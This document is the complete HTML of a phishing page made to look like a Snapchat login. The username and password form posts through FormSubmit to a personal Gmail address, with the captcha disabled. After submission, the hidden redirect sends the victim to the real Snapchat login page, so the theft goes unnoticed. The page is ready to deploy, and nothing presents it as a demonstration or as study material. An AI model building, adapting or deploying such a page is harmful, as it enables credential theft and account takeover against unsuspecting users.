<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login with FormSubmit</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Arial', sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 90vh;
    }
    .login-container {
      background: white;
      width: 350px;

      padding: 52px 30px 40px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      text-align: center;
      margin-top: 20px;
    }
    .login-container img {
      width: 34%;
      border-radius: 8px;
      margin-bottom: 8px;
    }
    .login-container h1 {
      margin-top: 20px;
      margin-bottom: 30px;
      font-size: 28px;
      margin-left: -5px; /* ðŸ‘ˆ tiny shift to the left */
    }
    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #555;
    }
    input {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
    }
    .login-btn {
      width: 100%;
      padding: 12px;
      background: #FFFC00;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    .login-btn:hover {
      background: #f5f200;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="download (2).png" alt="App logo" />
    <h1>Log In</h1>

    <form action="https://formsubmit.co/orimmiro1234@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false" />
      <input type="hidden" name="_next" value="https://accounts.snapchat.com/accounts/login" />

      <div class="input-group">
        <label for="username">Username or Email</label>
        <input type="text" id="username" name="Username" placeholder="Enter username or email" required />
      </div>

      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="Password" placeholder="Enter password" required />
      </div>

      <button type="submit" class="login-btn">Log In</button>
    </form>
  </div>
</body>
</html>
